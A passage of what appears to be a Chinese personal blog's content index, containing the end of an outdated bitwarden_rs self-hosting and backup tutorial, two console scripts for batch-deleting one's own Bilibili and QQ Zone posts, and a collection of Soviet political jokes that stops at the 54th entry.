等浏览器插件，直接安装就可以启用。\n在插件设置中填入你自己的 bitwarden 地址（否则是进入到官方的地址）\n更多设置等我出视频即可\nbitwarden 备份与恢复 # 手动备份 # bitwarden 备份最关键的就是 sqlite3 数据库文件了，你可以直接进入到/bw-data目录下，将 sqlite3 数据库保存下来。当然你也可以将 bw-data 目录下所有的包括附件文件夹、图标缓存文件夹、密钥等文件备份下来。\n自动备份 # 利用定时任务执行 bitwarden 备份，首先新建一个文件夹：mkdir /bw-data/db-backup，然后执行数据库备份任务。代码如下（关于定时任务可以自行搜索Crontab定时任务教程）：\nsqlite3 /bw-data/db.sqlite3 \u0026#34;.backup \u0026#39;/bw-data/db-backup/backup.sqlite3\u0026#39;\u0026#34; 恢复备份 # bitwarden 要恢复备份的话也很简单，直接将 sqlite3 数据库重写替换就可以了，其它的几个文件夹可以覆盖，也可以保留新的，不影响。如果你的数据库路径与原来的不一致，可以手动指定，代码示例：\ndocker run -d --name bitwarden \\ -e DATABASE_URL=/database/bitwarden.sqlite3 \\ -v /bw-data/:/data/ \\ -v /bw-database/:/database/ \\ -p 80:80 \\ bitwardenrs/server:latest 七牛云备份 # 本地备份只能防止数据出错，有恢复的余地。但是一旦服务器宕机，或者是无法连接，数据就取不出来了，这样就麻烦了。所以我们可以考虑使用七牛云备份到云服务器上，即使服务器宕机也可以把数据轻松下载下来。\n点击这里查看和下载 qshell。解压并命名为 qshell（应该是没有后缀名的），上传到服务器要执行该命令的用户目录里，比如我是用户名为 aliyun 的用户要执行该命令，就上传到/home/aliyun/upload/qiniu/目录下\n给 qshell 授权 # root 用户下授予 qshell 运行权限，开放给所有人\nchmod a+x qshell 配置好 qshell 的 ak 和 sk # ak 和 sk 可以在七牛云“个人中心”\u0026ndash;\u0026gt;“密钥管理”查看。（存储空间的完整名称，就是你在对象存储里新建的存储空间名字）\n./qshell account 你的access_key 你的secret_key aliyun（aliyun是我为qshell起的用户名，随便起） 完成之后检验一下是否添加成功：\n./qshell account 填写 qshell 配置文件 # 填写好上传配置文件，命名为 upload.conf，上传到 qshell 同一目录里，如果不清楚具体规则可以查看 qshell 的官方 git 主页。\n我这里给大家一份我用的备份信息,大家可以根据这个进行修改\n{ \u0026#34;src_dir\u0026#34; : \u0026#34;/bw-data\u0026#34;, \u0026#34;bucket\u0026#34; : \u0026#34;bitwarden-bak\u0026#34;, \u0026#34;file_list\u0026#34; : \u0026#34;\u0026#34;, \u0026#34;key_prefix\u0026#34; : \u0026#34;\u0026#34;, \u0026#34;up_host\u0026#34; : \u0026#34;\u0026#34;, \u0026#34;overwrite\u0026#34; : true, \u0026#34;check_exists\u0026#34; : false, \u0026#34;check_hash\u0026#34; : false, \u0026#34;check_size\u0026#34; : false, \u0026#34;rescan_local\u0026#34; : true, \u0026#34;skip_file_prefixes\u0026#34; : \u0026#34;\u0026#34;, \u0026#34;skip_path_prefixes\u0026#34; : \u0026#34;\u0026#34;, \u0026#34;skip_fixed_strings\u0026#34; : \u0026#34;\u0026#34;, \u0026#34;skip_suffixes\u0026#34; : \u0026#34;\u0026#34;, \u0026#34;log_file\u0026#34; : \u0026#34;/opt/qshell/upload.log\u0026#34;, \u0026#34;log_level\u0026#34; : \u0026#34;info\u0026#34;, \u0026#34;log_rotate\u0026#34; : 1, \u0026#34;log_stdout\u0026#34; : false, \u0026#34;file_type\u0026#34; : 0 } 之后执行./qshell qupload upload.conf查看上传效果\n使用 crontab 定时任务进行定时备份 # crontab -e # 进入cron定时界面 * 2 * * * /opt/qshell/qshell qupload /opt/qshell/upload.conf \u0026gt; /dev/null # 其中的路径要填写完整路径 总结 # bitwarden 作为一款开源的密码管理器，其本身支持平台之多，功能之全面，是替代 1Password 的理想品。bitwarden 安装简单，采用 Docker 镜像，特别适合已经有了 VPS 建站的朋友，在不影响建站的情况下正常使用 bitwarden。\nbitwarden 可以支持多用户注册使用，如果想要让 bitwarden 发送邮件的话，可以使用 SMTP 发邮件，参考代码如下：\ndocker run -d --name bitwarden \\ -e SMTP_HOST=\u0026lt;smtp.domain.tld\u0026gt; \\ -e SMTP_FROM=\u0026lt;bitwarden@domain.tld\u0026gt; \\ -e SMTP_PORT=587 \\ -e SMTP_SSL=true \\ -e SMTP_USERNAME=\u0026lt;username\u0026gt; \\ -e SMTP_PASSWORD=\u0026lt;password\u0026gt; \\ -v /bw-data/:/data/ \\ -p 80:80 \\ bitwardenrs/server:latest 本文部分内容参考自：wzfou bitwarden_rs Wiki。\n","date":"2020年5月4日","externalUrl":null,"permalink":"/posts/bitwarden-install/","section":"","summary":"[已过时] 通过简单的几个步骤，轻松的搭建一个密码管理平台","title":"[已过时] 免费开源的bitwarden_rs自建密码管理系统-安装,使用和备份教程","type":"posts"},{"content":"","date":"2020年5月4日","externalUrl":null,"permalink":"/tags/bitwarden/","section":"Tags","summary":"","title":"Bitwarden","type":"tags"},{"content":"","date":"2020年5月4日","externalUrl":null,"permalink":"/tags/%E5%AF%86%E7%A0%81%E7%AE%A1%E7%90%86/","section":"Tags","summary":"","title":"密码管理","type":"tags"},{"content":"","date":"2020年3月12日","externalUrl":null,"permalink":"/tags/b%E7%AB%99/","section":"Tags","summary":"","title":"B站","type":"tags"},{"content":" [!WARNING] 此教程已过时，不再适用\n详细教程请见：https://www.bilibili.com/video/av95622019/\n// 域名: space.bilibili.com var needDelDeled = true, delay = 1000, scrolls = 800; var w = \u0026#34;\u0026#34;, d = \u0026#34;\u0026#34;, r = 0; function getLuckyDraw() { w.css(\u0026#34;background-color\u0026#34;, \u0026#34;#f1c40f\u0026#34;); w = w.parents(\u0026#34;.card\u0026#34;); w.css(\u0026#34;background-color\u0026#34;, \u0026#34;#2ecc71\u0026#34;); w[w.length - 1].querySelectorAll(\u0026#34;.child-button\u0026#34;)[1].click(); setTimeout(clickDel, delay); } function getDel() { d.css(\u0026#34;background-color\u0026#34;, \u0026#34;#8e44ad\u0026#34;); d = d.parents(\u0026#34;.card\u0026#34;); d.css(\u0026#34;background-color\u0026#34;, \u0026#34;#2ecc71\u0026#34;); d[d.length - 1].querySelectorAll(\u0026#34;.child-button\u0026#34;)[1].click(); setTimeout(clickDel, delay); } function clickDel() { //点删除 $(\u0026#34;.popup-content-ctnr\u0026#34;) [$(\u0026#34;.popup-content-ctnr\u0026#34;).length - 2].querySelector(\u0026#34;.bl-button\u0026#34;) .click(); // 点确定 r += scrolls; $(\u0026#34;html, body\u0026#34;).animate({ scrollTop: r }, 30); $(\u0026#34;.fold-text\u0026#34;).click(); $(\u0026#34;.expand-btn\u0026#34;).click(); w = $(\u0026#34;.main-content\u0026#34;).find(\u0026#39;span[click-title=\u0026#34;抽奖详情\u0026#34;]\u0026#39;); d = $(\u0026#34;.main-content\u0026#34;).find(\u0026#34;.deleted-text\u0026#34;); if (d.length \u0026amp;\u0026amp; needDelDeled) setTimeout(getDel, delay); else setTimeout(getLuckyDraw, delay); } if (/dynamic/.test(window.location.href) \u0026amp;\u0026amp; confirm(\u0026#34;是不是要删除抽奖动态\u0026#34;)) { r += scrolls; $(\u0026#34;html, body\u0026#34;).animate({ scrollTop: r }, 30); $(\u0026#34;.fold-text\u0026#34;).click(); $(\u0026#34;.expand-btn\u0026#34;).click(); w = $(\u0026#34;.main-content\u0026#34;).find(\u0026#39;span[click-title=\u0026#34;抽奖详情\u0026#34;]\u0026#39;); //*互动抽奖内容定位 d = $(\u0026#34;.main-content\u0026#34;).find(\u0026#34;.deleted-text\u0026#34;); //*已删除内容定位 if (d.length \u0026amp;\u0026amp; needDelDeled) setTimeout(getDel, delay); else setTimeout(getLuckyDraw, delay); } ","date":"2020年3月12日","externalUrl":null,"permalink":"/posts/bilibili-del-luck-draw-dynamic/","section":"","summary":"B站批量删除抽奖动态脚本","title":"B站批量删除抽奖动态脚本","type":"posts"},{"content":"详细使用教程请见：https://www.bilibili.com/video/av95148891/\n// 网站：user.qzone.qq.com var temp = true; function clickDel() { try { document.querySelector(\u0026#39;.app_canvas_frame\u0026#39;).contentDocument.querySelector(\u0026#39;.del_btn\u0026#39;).click(); } catch{ var a = document.querySelector(\u0026#39;.app_canvas_frame\u0026#39;).contentDocument.querySelector(\u0026#39;.mod_pagenav_main\u0026#39;).querySelectorAll(\u0026#39;.c_tx\u0026#39;); a[a.length - 1].click(); temp = false; setTimeout(clickDel, 2000); } setTimeout(clickYes, temp ? 2000 : 5000); temp = true; } function clickYes() { document.querySelector(\u0026#39;.qz_dialog_layer_btn\u0026#39;).click(); setTimeout(clickDel, 2000); } if (confirm(\u0026#34;是不是要删除说说\u0026#34;)) { setTimeout(function () { document.querySelectorAll(\u0026#34;a[tabindex]\u0026#34;)[8].click(); setTimeout(clickDel, 2000); }, 3000); } ","date":"2020年3月10日","externalUrl":null,"permalink":"/posts/shuoshuo-script/","section":"","summary":"\u003cp\u003e详细使用教程请见：https://www.bilibili.com/video/av95148891/\u003c/p\u003e","title":"[已过时] 说说一键自动批量删除脚本","type":"posts"},{"content":"","date":"2020年3月10日","externalUrl":null,"permalink":"/tags/qq%E7%A9%BA%E9%97%B4/","section":"Tags","summary":"","title":"QQ空间","type":"tags"},{"content":"","date":"2020年3月10日","externalUrl":null,"permalink":"/tags/%E8%84%9A%E6%9C%AC/","section":"Tags","summary":"","title":"脚本","type":"tags"},{"content":"","date":"2020年2月24日","externalUrl":null,"permalink":"/tags/%E7%AC%91%E8%AF%9D/","section":"Tags","summary":"","title":"笑话","type":"tags"},{"content":"苏联政治笑话系列是我迄今为止看到的含金量最高，最具幽默感的笑话。经过收集，已知中文网上存在着的苏联在政治笑话大概有 500 则左右。这些笑话大概有两个来源，一是苏联及其他社会主义国家（笑话中较常出现的是民主德国、古巴）人民表达自己愤怒的一些地下文学形式；二是资本主义国家在冷战期间进行意识形态作战采取的一种方式，其中 CIA（美国中央情报局）和美国驻苏联记者应该功不可没。\n现我将收集到的苏联政治笑话整理为 314 则列在下面，删除的笑话根据这三个原则：一是笑点重复，这是最大的一部分，很多笑话都是讽刺苏联政治生活的一个特定点，没有必要都列出；二是笑点与苏联和社会主义制度无关，只是套上苏联或社会主义的外衣；三是笑点低级，明显和其他笑话不处于一个水平，疑为伪作。\n序曲 # 一位内务人民委员部审判员结束一天的审判工作，回到办公室，突然独自大笑起来。\n对面办公桌的同事奇怪的问道：“有什么好笑的事吗？”\n“是啊，”审判员用手帕擦着笑出来的眼泪：“一个很好笑的笑话……”\n“哦？说来听听？”\n“你疯了吗？！我刚判了说这笑话的家伙五年苦役！”\n1: # 内务人民委员部的一间牢房里关了三个人，彼此间谈起坐牢的原因。\n第一个人说：“我因为反对党委书记彼得罗夫。”\n第二个人说：“我因为支持彼得罗夫。”\n第三个人说：“我就是彼得罗夫。”\n2: # 美国外交代表团到苏联访问，苏修接待官员陪他们参观“建设的伟大成就”，并且得意的说：“到了下一个五年计划，每个苏联家庭都可以拥有一架私人飞机！”\n美国人惊讶的问：“ 他们要飞机干什么呢？”\n苏修官员说：“当然有用啊……譬如你在莫斯科听说列宁格勒开始供应面包了，你可以马上开飞机赶去排队啊。”\n3: # 一位公民打电话到基辅电台问主持人：“共产主义到底是艺术还是科学？”\n主持人说 ：“我也不清楚，但我肯定不是科学”\n“为什么？”\n“如果是科学的话，他们应该拿狗做试验。”\n4: # 苏修穷兵黩武，军中物质紧缺。\n军需处长在一名下士的陪同下到兵营视察物质供应情况。他们走到油料库附近，在地上发现一个烟头。军需处长不满的说：“这是谁的烟头？！”\n下士看了看四周，欣喜的说：“看来谁的也不是，上校同志，赶快拣起来吧！”\n5: # 苏联领袖被邀请到法国巴黎访问。法国官员带他到处看看，他对国防总部、巴黎地下铁、凯旋门、国画馆、高速公路网和闻名世界的 TGV 快铁都不感兴趣。当法国官员带他到巴黎艾菲尔铁塔前时，他忽然对铁塔很感兴趣。他对法国官员问道：“啊哈！巴黎是不是有九百万人口？”\n法国官员：“您说的一点都不错。”\n领袖洋洋得意道：“哈哈，终于找到了，原来你们巴黎九百万人共享一台钟塔！”\n6: # 地狱有个规矩，谁在人间害了人，被害人的血将淹此人。\n一次上帝去地狱视察，发现血只浸到贝利亚的腿。上帝就很奇怪，问到：“你杀了这么多人，怎么血只及腿呢？”\n贝利亚答道：“因为我站在伟大领袖斯大林的肩上！”\n【贝利亚：苏联秘密警察首脑】\n7: # 赫鲁晓夫到处作报告，一天，他去某疯人院作报告，事先该疯人院负责人把疯子召集起来叮嘱：“在赫同志作完报告后要热烈鼓掌”。赫作完报告后果然博得了长时间经久不息的掌声，赫非常得意。但他突然发现，其中有一个人没有鼓掌，他顿时大发雷霆。赫问：“ 你为什么不鼓掌？”此人答曰：“我的疯病已经治好了。”\n8: # 斯大林、赫鲁晓夫和勃列日涅夫乘坐火车出门。开着开着，火车突然停了。\n斯大林把头伸出车窗外，怒吼道：“枪毙火车司机！”可是车还是没有动。\n接着赫鲁晓夫说：“给火车司机恢复名誉！”车仍然没有动。\n勃列日涅夫说：“同志们，不如拉上窗帘，坐在座位上自己摇动身体，做出列车还在前进的样子……”\n9: # 苏联的一次大会上，主持人突然说：下面请认为社会主义好的同志坐到会场的左边，认为资本主义好的同志坐到会场右边。大部分人坐到了左边，少数人坐到右边，只有一个人还坐在中间不动。\n主持人：那位同志，你到底认为社会主义好还是资本主义好？\n回答：我 认为社会主义好，但是我的生活像是资本主义。\n主持人慌忙说：那请您赶快坐到主席台上来。\n10: # 列宁快去世了，叫赶快把继承人斯大林召进克里姆林宫来，临终有几句话要嘱托：“不瞒你说，我还有一个隐忧啊，斯大林。”\n“说吧，亲爱的伊里奇。”斯大林专心地听着。\n“ 那就是，人们会跟你走吗？不知你想过了没有？”\n“他们一定会跟我走的。”斯大林强调说，“一定会！”\n“但愿如此。”列宁说，“我只是担心，万一他们不跟你走，你怎么办？”\n“那只好让他们跟你走！”\n11: # 社会主义者、资本主义者、共产主义者商定要见一面。社会主义者过了约会的时间才到。\n——“对不起，我去排队买香肠来着。”\n——“什么是排队？”资本主义者问。\n——“什么是香肠？”共产主义者问。\n12: # 数学和科学社会主义有什么区别？\n在数学上，如果给出什么东西，都需要证明，而科学社会主义什么都能证明，就是什么也不能提供。\n13: # 马克思想在苏联发表广播演说。勃列日涅夫对他说：“虽然您是奠基人，但是我一个人不敢决定那么重大的问题。我们是集体领导。”\n“我只想说一句话！”\n最后，勃列日涅夫只允许他说一句话，并且要他自己负责。马克思凑近话筒，大声说道：\n“全世界的无产者，请原谅我！”\n**有的版本还有一个补充的结尾：\n列宁看到苏联现在建设的社会主义，说：看来我要回到瑞士去，以便重头开始“\n14: # 有个人向赫鲁晓夫汇报说：“现在大剧院正上演一个剧，里面有您出现，每当您一出场，下面就热烈鼓掌。”赫鲁晓夫听了以后非常得意。有一天他买了一张普通票，去看这个剧，他陷入了沉思，忘记了鼓掌，这时旁边有人推了他一把，紧张地说：“哎！你为什么不鼓掌？不要命啦？！”\n15: # 在苏共二十三次代表大会上，勃列日涅夫作报告，他问：“我们这里有没有敌人？”一个人回答：“有一个，他坐在第四排第十八号位子上。”勃问：“为什么他是敌人？”回答：“列宁说过敌人是不会打瞌睡的，我发现全场只有他一个人没有打瞌睡！”\n16: # 演讲人在做关于五年计划成就的报告：在列宁格勒新建了一个电站。\n大厅里有人说：“我刚从那回来，那没有什么电站。”\n演讲者没有回答，继续说：“在斯大林格勒已建成了一个化学厂。”\n大厅里有人说： “一周前我在那里，那里没有什么化学厂。”\n演讲人：“同志们，你们最好少东游西逛的，要多看一些报纸！比如《真理报》！”\n17: # 斯大林在大会上引经据典地说：“马克思和列宁说 1+1=2，而托洛茨基和布哈林说 1+1 不等于 3。是托洛茨基和布哈林说的对呢？还是马克思和列宁说得对呢？”下面听众一脸疑惑，“毫无疑问，是马克思和列宁说的对！”底下热烈鼓掌，“托洛茨基和布哈林是帝国主义派来的间谍，说 1+1 不等于 3 的人罪不容赦……”\n18: # 集体农庄庄员伊万在河里捉到一条大鱼，高兴的回到家里和老婆说：“看，我们有炸鱼吃了！”\n“没有油啊。”\n“那就煮！”\n“没锅。”\n“烤鱼！”\n“没柴。”\n伊万气死了，走到河边把鱼扔了回去。那鱼在水里划了一个半圆，上身出水，举起右鳍激动地高呼：“斯大林万岁！”\n19: # “瑞典能否建立共产主义”？\n“不能。”\n“为何？”\n“列宁同志说了：共产主义不在山那边。”\n20: # 美术馆里有一幅描写亚当和夏娃的画。\n一个英国人看了，说：“他们一定是英国人，男士有好吃的东西就和女士分享。”\n一个法国人看了，说：“他们一定是法国人，情侣裸体散步。”\n一个苏联人看了，说：“他们一定是苏联人，他们没有衣服，吃得很少，却还以为自己在天堂！\n21: # 一老者人行道闲溜，不慎落入道旁河中。随高呼救命！\n两警察闻之，视若不见，仍边走边谈笑如旧。\n老者情急生智，随又高呼“打倒勃列日涅夫”！两警察闻之大惊，随急速跳入河中，将老者拖上岸来铐之。\n22: # 某日苏联举行国庆游行，沿着大街开来了炮兵、机械化步兵、坦克、自行火炮、战术导弹、战略核导弹，破坏力一个比一个大；队列末尾却是两个带公文包的矮子。\n在看台上勃列日涅夫惊讶地说：“这两个人破坏力比核导弹还大！他们是什么人？”\n克格勃头子说：“不是我的人。”\n国防部长说：“没见过他们。”\n苏联总理说：“他们是国家计委的……”\n【计委：计划经济委员会/纪委：纪律检查委员会】\n23: # 勃列日涅夫,杜布切克(捷克总书记),英国首相和美国总统,4 人乘坐气球.\n气球漏气了,抬不动 4 人,开始下坠,万分危机,必须有人牺牲自己跳出.\n先是美国总统喊了声\u0026quot;为了自由世界!\u0026quot;,然后跳了出去.气球下坠暂缓,但过一会儿漏气更多,下坠又加快,必须再跳出 1 人.\n于是英国首相喊:\u0026ldquo;为了女王陛下!\u0026quot;,跳了出去.\n暂缓一会儿又不行了,于是勃列日涅夫喊道:\u0026ldquo;为了社会主义大家庭!\u0026ldquo;说着就把杜布切克扔出去了.\n24: # 一个莫斯科市民的鹦鹉丢了。这是只会骂人的鹦鹉，要是落到克格勃的手里可糟了。这人便在报纸上发表了一篇声明：“本人遗失鹦鹉一只，另外，本人不同意它的政治观点。”\n25: # 一个英国人,一个法国人,一个苏联人谈论什么是世界上最幸福的事\n英国人：最幸福的事情就是冬天晚上回家，穿着羊毛裤坐在壁炉前面。\n法国人：你们英国人就是古板，最幸福的事情是和一个金发女郎一起去地中海度假，然后我们好和好散。\n苏联人：最幸福的事情就是半夜有警察敲门，开门后：伊万，你被捕了。\n…：你弄错了，伊万在隔壁。\n26: # 话说勃烈日涅夫同志当上苏共中央总书记之后，将在乡下的老母亲接到了莫斯科。老太太来了以后，勃列日涅夫得意洋洋地向老妈展示了一番自己的豪华别墅、高级汽车、名贵家具等等，展示完了后，勃列日涅夫问老太太这一切如何？老太太说：“儿子啊，这一切都很好，但是，共产党来了你怎么办？”\n27: # 勃列日涅夫和美国总统卡特在瑞士开会，休息时间两个人很无聊，就开始比谁的保镖更忠诚。卡特先来，他把自己的保镖叫进来，推开窗（外面是 20 层楼）说： “约翰，从这里跳下去！”约翰哭着说：“你怎么能这样呢，总统先生，我还有老婆孩子呐。”卡特被感动了，流着泪说是自己不对，叫约翰走了，然后抡到勃列日涅夫，他也大声叫自己的保镖伊万。“伊万，从这里跳下去！”伊万二话不说就要往下跳，卡特一把抱住他说：“你疯了？跳下去会死的！”伊万一边挣扎着要跳下去一边说：“放开我，混蛋，我还有老婆孩子呐。”\n28: # 列宁的夫人曾经当面指出斯大林的专制独裁统治，令后者气急败坏，斯大林说：“你再说，我就宣布你不是列宁的妻子！\n29: # 古巴举行盛大五一节游行，卡斯特罗率党和国家领导人全体出席，检阅游行队伍。就在游行队伍通过主席台的时候，卡斯特罗同志突然发现人群中有一个人掏出一块新手帕擦了擦鼻子，于是他马上对身边的一位政治局委员道：“我敢打赌，这个拿手帕擦鼻子的人里面没穿内裤！”委员不以为然，难道卡斯特罗同志真长了透视眼不成？他马上命令警卫把那个人叫道跟前，亲自询问，吃惊地发现，这人长裤里面果然是光着的。委员敬佩地问领袖：“卡斯特罗同志，您是如何知道透过外衣看见他没穿内裤的？”卡斯特罗回答：“我看见他掏出了新手帕，他的布票显然没用来买内裤嘛。”众人大惊，无不佩服领袖超凡的洞察力……\n30: # 美国人登月成功后,勃列日涅夫当天就打电话给苏联宇航员：“鉴于美国人已经在月球上登陆，现在苏联决定，马上派你们去太阳登陆”。宇航员大惊，哽咽道： “您不知道吗，勃列日涅夫同志，我们会被烧死的”。勃列日捏夫生气地说：“你以为政治局没有考虑过吗？我们已经决定，派你们在晚上在太阳登陆！”\n31: # 一个美国代表团要访问一个苏联的工厂，当局就预先教工人要怎样回答代表团的提问。代表团来后问一个老工人你每月的工资是多少，老工人回答有 3000 卢布；代表团又问他有多少存款，他回答有 10 万卢布；代表团问：你存了这么多钱准备干什么呢？老工人回答说：“我准备买一双靴子。”\n32: # 二战结束后一个波兰农村老太看到街上贴着的照片就说像自己的外甥\n别人训斥她：瞎说什么，这是斯大林同志\n老太：他是干什么的？\n答：他赶跑了纳粹\n老太急切地问：他能不能把俄国人也赶跑啊？\n33: # 老师在莫斯科街上碰到以前的学生斯基洛夫（已经当了克格勃）。\n老师说：现在的学生学习可真不象话，上课时我问他们《叶甫盖尼·奥涅金》是谁写的，他们居然没人回答；逐个问，居然都说“不是我写的”\n斯基洛夫：这是一个问题，这件事交给我吧\n过了一周，斯基洛夫兴致勃勃地找到老师：我审了他们几天，事情解决了；伊万那小子招了，是他写的\n老师：…………\n【《叶甫盖尼·奥涅金》：普希金的著名作品】\n34: # 去买报纸，要一份《真理报》。报贩回答：《真理》没有了，只有《消息》。\n35: # 苏联赫鲁晓夫访问美国，美国总统送一最新高科技电话，曰，上可打天堂，下可打地狱，中可打人间，乃美国最新高科技产品。\n赫鲁晓夫回国后，一日想起，拿起电话拔通天堂。“喂，你好，请帮我转列宁同志。”“请稍侯\u0026hellip;”电话那边接线生答道，“对不起，查无此人，请查清号码再拔”\n老赫一想，莫非导师不在天堂，在地狱？于是拨到地狱。“喂，你好，请帮我转列宁同志。”“请稍侯\u0026hellip;列宁同志在线，现在就帮您转过去”\n老赫于是将最近几十年的革命形势和国际斗争局势一五一十地向导师作了汇报，并听取了导师的指导。\n月底，电话费清单寄来，老赫一看大惊！打到天堂的问询电话不过 1 分钟却收费 100 美元，打到地狱的 1 个多小时汇报和批示，却才 1 美元。大惑不解，遂电话问询美国总统－－这是为何？\n美国总统在大洋彼岸答曰：“事情是这样的，你们苏联打电话到天堂是长途，打电话到地狱却是市话，所以\u0026hellip;”\n36: # 一日，某君站在柜台前观看。一大脑标价 50 万美元，某君定睛一看，克林顿大脑。心下叹服，果然是美国总统，不同凡响。再看，另一大脑标价 100 万美元，乃爱因斯坦大脑，某君再叹，果然是天才天价，值！\n还看，见一大脑标价 200 万美元，是朝鲜某相国大脑。某君大惑不解，问售货小姐何故。\n小姐从容答道，小克老爱大脑虽好，却是用旧的二手货。此相国大脑却是全新，从未用过，故此价值 200 万！\n37: # 赫鲁雪夫和肯尼迪交谈，各自吹嘘，肯尼迪说：“美国医学发达，有种药片死人吃了可以复活。”赫鲁雪夫说：“苏联体育发达，有人十分钟可以从莫斯科跑到美国。”肯尼迪要求兑现，赫鲁雪夫慌了手脚，召集文武大臣商量对策，有人出了个好计策说：“这很好办，你先让肯尼迪把药片拿来，让斯大林吃了，那斯大林一定复活，那么你用不了五分钟就可以从苏联跑到美国。”\n38: # 赫鲁晓夫在苏共二十大揭露斯大林的暴行时，台下有人递条子上去。\n赫鲁晓夫当场宣读了条子的内容：“赫鲁晓夫同志，当时你在干什么？”。\n然后问道：“这是谁写的，请站出来！”。\n连问三次，台下一直没有人站出来。\n于是赫鲁晓夫说：“现在让我来回答你吧，当时我就坐在你的位置上。”\n39: # 叶利钦、克林顿和金 2，在森林里散步，遇到一只恶狼。\n狼拦住小克说，俺要吃你。小克慌道，狼啊狼啊，别吃俺，俺给你美元。狼一想，也行。\n于是走到老叶跟前说，俺要吃你。老叶忙说，俺俄罗斯虽没钱，但俺有美女，给你美女，放俺一马。狼一想，也行罢。\n狼这回到了金 2 跟前，说，俺要吃你。\n金 2 的拍大腿，说，俺不怕你！\n狼吃惊道，小克老叶都怕俺，你为何不怕？金 2 说，俺不怕你，因为俺身后有 200 万朝鲜痨冻党员，所以俺不怕你。\n狼卟通一声跪下，声泪俱下说：“总书记啊，俺终于找到组织了！\n40: # 勃列日涅夫即将访问波兰，波兰当局命令一位著名画家创作一幅名为《勃列日涅夫在波兰》的大型油画作为献礼。很不情愿的画家在威逼下接受了工作。画完成后，波兰一高官前来验收，结果让他大吃一惊：画面上是一男一女在豪华的大床上极尽缠绵，窗外的风景是克里姆林宫。“这是什么？这女的是谁？！”高官愤怒的问。“勃列日涅夫的夫人。”画家答道。“男的呢？！”“勃列日涅夫的秘书。”“可勃列日涅夫同志在哪里？”“勃列日涅夫在波兰。”画家答道。\n41: # 苏联领导人坐火车旅行。铁轨到了尽头，火车停下。\n列宁号召：“立即发动无产者搞星期六义务劳动，修铁路，直通共产主义！”\n斯大林抽着烟斗，严肃地下令：“给我调 100 万劳改犯来，修不通铁路，统统枪毙。”\n赫鲁晓夫敲着皮鞋喊：“把后面的铁路接到前面去，火车继续开！”\n勃列日涅夫挥舞着双手说：“坐在座位上自己摇动身体，做出列车还在前进的样子。”\n最后，戈尔巴乔夫沉思道：“把火车拆了，到有铁轨的地方再拼装起来。”\n于是苏联解体了。\n42: # 幼儿园.小女孩写了首小诗朗诵起来:\n我家有只大花猫,生下三个猫宝宝,猫眯个儿还没长,喵喵喵喵都入党\u0026hellip;\n园长大喜,夸奖一番:党委下来检查,乖乖你就上吧\u0026hellip;\n检查团来了,小孩朗诵道:\n我家有只大花猫,生下三个猫宝宝,猫眯个儿还没长,喵喵两个都入党\u0026hellip;\n园长低声提醒:三个,不是两个\u0026hellip;\n小孩委屈道:可是\u0026hellip;可是另一只已经睁眼了\u0026hellip;\n43: # 赫鲁晓夫在东德的一次演讲中，刚念到“伟大的国家。。。。”，外头就传来了“爆米花，又香又甜又脆的爆米花”的叫卖吆喝声。。。\n赫鲁晓夫没管，继续他的演讲，可当他刚讲完一句，外头又传来了“爆米花，又香又甜又脆的爆米花！”的吆喝。\n如此反复了四遍，赫鲁晓夫终于忍不住了，大声呵斥到：“谁喊的，给我站出来，看我不一脚把你踹到柏林墙那边去！！”\n赫鲁晓夫刚说完，全场的听众都站了起来，大声喊到：“爆米花，又香又甜又脆的爆米花！”\n44: # 一个苏联人准备移民去美国，上级知道了很不高兴。于是组织了一个委员会给他做思想工作，领导说：“同志，你为什么要去美国？是因为不满意没有好吃的？” “不是。”“是因为不满意住房条件太差？”“不是。”“是因为不满意工资水准太低？”“不是。”“那我们不明白了，你没有什么不满意的，为什么要去美国？”“因为在美国，我可以有不满意。”\n45: # 美国宇航员和苏联宇航员同时登上了月球。苏联宇航员宣布月球属于苏维埃政权，美国宇航员得到来自休斯敦的命令：“不要与苏联人发生冲突”。于是，美国宇航员眼睁睁看着苏联人把整个月球漆成红色然后扬长而去。这时，他们得到了来自休斯敦的指令：“ 在上面写上白色的 COCA COLA。”\n46: # 克里姆林宫，勃列日涅夫拿起通往埃及总统府的电话：“我是勃列日涅夫，我要和萨达特总统的遗孀讲话！”\n“遗孀？ 萨达特总统可一直都活着呀？”电话另一端传来惊讶的声音。\n老勃放下电话，冲身旁的克格勃头子大喊：“混蛋！为什么把原订的行动时间推迟了？”\n47: # 一位莫斯科市民在公交车上：“您好同志，请问您是克格勃吗？”\n“不是。”\n“那您的家人或直系亲属有在克格勃工作吗？”\n“没有。”\n“那您有朋友在克格勃吗？”\n“没有。”\n“那您把脚拿开好吗，您踩到我脚了”\n48: # 勃列日涅夫执政时期，政局混乱\n有个人骂了句勃列日涅夫是傻子，结果无期了\n本来他只要判两年，结果法官说他泄露了国家机密，就无期了\n49: # 对苏联知识分子来说有五个规则：\n什么都别去思考；\n如果你一定要思考，不要说出来；\n如果你又要思考又要说，那就别写出来；\n如果你又思考又说还写，那么别签名；\n如果以上规则你都不遵守，那你就别感到吃惊\n50: # 斯大林在办公室发现了老鼠。他跟加里宁省主席抱怨这事，后者想了一会说：“你干嘛不立个牌子上面写着：‘集体农庄’？这样一半老鼠会饿死，另一半则会跑掉”\n51: # 伊万诺维奇入党。这以前他必须经过党委会面试\n伊万诺维奇同志，你抽烟吗？”\n“时不时抽一些”\n“你知道列宁同志不抽烟而且号召其他同志也不抽烟吗？”\n“既然列宁同志这样说，我会戒烟的”\n“你喝酒吗？”\n“喝一点”\n“列宁同志强烈反对酗酒”\n“那么我会戒酒的”\n伊万诺维奇同志，你对女人怎么看？”\n“有一点。。。。”\n“你知道列宁同志强烈谴责不道德行为吗？”\n“既然列宁同志这么看，那么我不会再爱女人啦”\n“IVANOV 同志，你随时准备着为党作出牺牲吗？”\n“当然。谁愿意这么活着？（WHO NEEDS SUCH LIFE？）”\n52: # “将军的儿子能成为元帅吗？”\n“不可能。元帅都有儿子”\n53: # 勃列日涅夫访问印度时，大批印度人到机场欢迎勃列日涅夫。勃列日涅夫便问当时的印度总理英甘地，你是用什么办法让这么多人来欢迎我的？英甘地回答：凡是来欢迎你的人，都能够得到 5 个卢比（印度货币）的奖励。\n后来英甘地到苏联访问时，成千上万的苏联人从机场到莫斯科市内的道路上夹道欢迎。英甘地问勃列日涅夫：你是用什么办法让这么多人来欢迎我的？勃列日涅夫回答：凡是不来欢迎你的莫斯科人，每人罚款 5 卢布（苏联的货币）\n54: # 